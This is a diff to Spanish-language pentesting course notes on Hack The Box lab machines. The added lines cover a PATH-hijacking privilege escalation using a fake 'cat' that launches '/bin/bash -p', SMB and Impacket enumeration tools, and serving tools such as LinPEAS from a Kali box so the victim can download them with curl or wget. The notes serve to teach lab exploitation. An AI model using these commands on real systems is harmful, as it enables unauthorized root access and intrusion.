@@ -131,6 +131,9 @@ export PATH=/tmp:$PATH
 > [!warning] NO USAR CAT PARA LEER LA FLAG
 > Tras secuestrar PATH, `cat` ya no es el real. Usar `nano root.txt` o cualquier alternativa.
 
+> [!tip] VARIANTE CON BASH -p (clase 34)
+> `echo -e '#!/bin/bash\n/bin/bash -p' > cat` — la opción `-p` (privileged) evita que bash descarte los permisos heredados. Necesaria cuando el `cat` falso lanza **bash** en vez de `sh`.
+
 ### 2.7 ¿Por qué funciona el PATH hijacking?
 
 Cuando un programa llama a `cat` sin ruta absoluta, el sistema lo busca en PATH (en orden). Por defecto: `/usr/local/bin`, `/usr/bin`, `/bin`... Al anteponer `/tmp`, encuentra nuestro `cat` falso primero. Como el binario corre como root → nuestra shell también.
@@ -165,6 +168,12 @@ dir
 get prod.dtsConfig # archivo de configuración con credenciales
 ```
 
+| Herramienta SMB | Uso (fuente: Andres 15.06) |
+|-----------------|----------------------------|
+| `smbclient` | Conectarse a comparticiones |
+| `smbmap` | Enumerar permisos |
+| `enum4linux` | Enumeración completa |
+
 > [!danger] REGLA NEMOTÉCNICA
 > Todo archivo que empiece o termine por "config" **"huele muy mal"**: suele contener usuario y contraseña. `prod.dtsConfig` contiene un usuario SQL, su contraseña y el nombre del host.
 
@@ -177,6 +186,17 @@ impacket-mssqlclient NOMBREMAQUINA/usuario@IP -windows-auth
 # ¿Somos sysadmin?
 SELECT IS_SRVROLEMEMBER('sysadmin'); -- devuelve 1 = sí
 ```
+
+**Impacket** es una colección de herramientas de red en Python, incluida por defecto en Kali: clientes para SMB, MSSQL, RDP y Kerberos, más post-explotación (`secretsdump`, `psexec`).
+
+```bash
+# Instalar/actualizar si no está disponible (clase 34)
+git clone https://github.com/fortra/impacket
+cd impacket && pip3 install . --break-system-packages
+```
+
+> [!info] HACKTRICKS COMO REFERENCIA
+> `book.hacktricks.xyz` tiene una página completa de MSSQL con comandos de enumeración, vectores de ataque y técnicas de escalada. Mismo rol que GTFOBins para binarios Linux.
 
 ### 3.4 Activación de xp_cmdshell
 
@@ -243,6 +263,32 @@ evil-winrm -i IP -u administrator -p 'CONTRASEÑA'
 cd C:\Users\Administrator\Desktop
 type root.txt
 ```
+
+---
+
+### Transferencia de archivos (toolbox transversal — Chema C.1)
+
+La máquina de HTB **no tiene Internet**: no puede descargar herramientas directamente. Se levanta un servidor HTTP en Kali y se descarga desde la víctima.
+
+```bash
+# En tu Kali (carpeta con el fichero, p. ej. linpeas.sh)
+python3 -m http.server 8000
+
+# En la víctima: curl (alternativa a wget de PowerShell)
+curl http://KALI:8000/linpeas.sh -o linpeas.sh
+# o wget
+wget http://KALI:8000/linpeas.sh
+```
+
+**Alternativas de transferencia:**
+
+- Subir por el propio **`/uploads`** de la web (si existe)
+- Por **FTP** si está disponible
+- Con **scp** si tenemos SSH
+- **parsing_peas**: wrappers que descargan LinPEAS/WinPEAS en la víctima, los ejecutan y devuelven el resultado a Kali en **HTML** (más cómodo de revisar)
+
+> [!tip] ESCAPE DEL TTY / SHELL RARA
+> Si tras el upgrade el terminal sigue raro: alternativas `script -qc /bin/bash /dev/null` (en vez de pty), o `socat`. Útiles también `reset` y `export TERM=xterm`. Si `ifconfig` no va → `ip a`.
 
 ---
 
@@ -341,11 +387,14 @@ impacket-psexec administrator:'PASS'@IP
 - [ ] ¿Sé buscar archivos por grupo con `find` y analizar binarios con `strings`/`file`?
 - [ ] ¿Entiendo y sé ejecutar el secuestro de PATH (cat malicioso) para escalar a root?
 - [ ] ¿Sé enumerar SMB por sesión nula con `smbclient -N` y descargar archivos config?
+- [ ] ¿Conozco las alternativas SMB (`smbmap`, `enum4linux`) y las vías de transferencia (curl/FTP/scp/uploads)?
 - [ ] ¿Sé conectarme a MSSQL con Impacket y comprobar el rol sysadmin?
 - [ ] ¿Sé activar y usar `xp_cmdshell` para ejecutar comandos del sistema?
 - [ ] ¿Sé transferir Netcat/WinPEAS con `python http.server` + `wget` de PowerShell?
 - [ ] ¿Sé interpretar el informe de WinPEAS/LinPEAS (prioridad a lo rojo)?
 - [ ] ¿Sé usar `psexec.py` o `evil-winrm` con credenciales de Administrator?
+
+
 
 
 
@@ -359,26 +408,15 @@ impacket-psexec administrator:'PASS'@IP
 
 ### Documentos Relacionados
 
-- [[../../apuntes Chema/Maquinas/Explotación de Máquinas Locales I.md|Explotación de Máquinas Locales I]] — IDOR, Metasploit, Netcat / Reverse Shells
-- [[../../apuntes Joselu/MODULO3/resumen_master_clase34.md|resumen_master_clase34]] — IDOR, Metasploit, Netcat / Reverse Shells
-- [[Son ROBOTS - RickdiculouslyEasy y Mr. Robot.md|Son ROBOTS - RickdiculouslyEasy y Mr. Robot]] — Escalada de Privilegios, Linux, Netcat / Reverse Shells
-- [[../../apuntes Chema/Maquinas/Son ROBOTS.md|Son ROBOTS]] — Escalada de Privilegios, Linux, Netcat / Reverse Shells
-- [[../../apuntes evolve/BLOQUE 5.md|BLOQUE 5]] — Linux, Metasploit, Netcat / Reverse Shells
-- [[../../apuntes Andres/15.06.2026 Repaso Semanal II Archetype Completa, SMB y Primera Máquina Windows.md|15.06.2026 Repaso Semanal II Archetype Completa, SMB y Primera Máquina Windows]] — IDOR, Linux, Netcat / Reverse Shells
+- [[../../apuntes Chema/Maquinas/Explotación de Máquinas Locales I.md|Explotación de Máquinas Locales I]] — GoBuster, Hack The Box, Windows
+- [[../../apuntes Joselu/MODULO3/resumen_master_clase34.md|resumen_master_clase34]] — Hack The Box, Post-Explotacion, Windows
+- [[../../apuntes Andres/15.06.2026 Repaso Semanal II Archetype Completa, SMB y Primera Máquina Windows.md|15.06.2026 Repaso Semanal II Archetype Completa, SMB y Primera Máquina Windows]] — Hack The Box, Nmap, Windows
+- [[../../apuntes Chema/Maquinas/Rockstar - Escalada Linux y LFI.md|Rockstar - Escalada Linux y LFI]] — GoBuster, Nmap, Post-Explotacion
+- [[../../apuntes Andres/12.06.2026 HTB Starting Point Tier 2 Crocodile Completa y Tres Nuevos Conceptos en Archetype.md|12.06.2026 HTB Starting Point Tier 2 Crocodile Completa y Tres Nuevos Conceptos en Archetype]] — Hack The Box, Post-Explotacion, Windows
 
-### 🛠️ Herramientas
+### 🌐 Cross-Dominio
 
-- [[comandos/DirSearch|DirSearch]]
-- [[comandos/Feroxbuster|Feroxbuster]]
-- [[comandos/GoBuster|GoBuster]]
-- [[comandos/Hydra|Hydra]]
-- [[comandos/Metasploit|Metasploit]]
-- [[comandos/Metasploit|Netcat / Reverse Shells]]
-- [[comandos/Nmap|Nmap]]
-- [[comandos/SMB_Impacket|SMB / Impacket]]
-- [[comandos/SSH|SSH]]
+- [[../../../programacion/Csharp/seguridad_csharp.md|seguridad_csharp]] — Programacion: Desarrollo Web, Linux, SQL
+- [[../../../programacion/Java/seguridad_java.md|seguridad_java]] — Programacion: Desarrollo Web, Linux, SQL
 
-### 🎯 Vulnerabilidades Relacionadas
-
-
-> #dirsearch #escalada-privilegios #feroxbuster #gobuster #hack-the-box #hydra #idor #linux #metasploit #netcat #nmap #pentest #post-explotacion #redes #reverse-shell #smb-impacket #ssh #vulnhub #windows
+> #cli #crypto #database #dirsearch #escalada_privilegios #feroxbuster #gobuster #hack_the_box #hydra #idor #java #javascript #linux #linux_ciber #metasploit #netcat #nmap #pentest #post_explotacion #python #redes #redes_ciber #reverse_shell #smb_impacket #sql #ssh_tool #vulnhub #web #windows_ciber
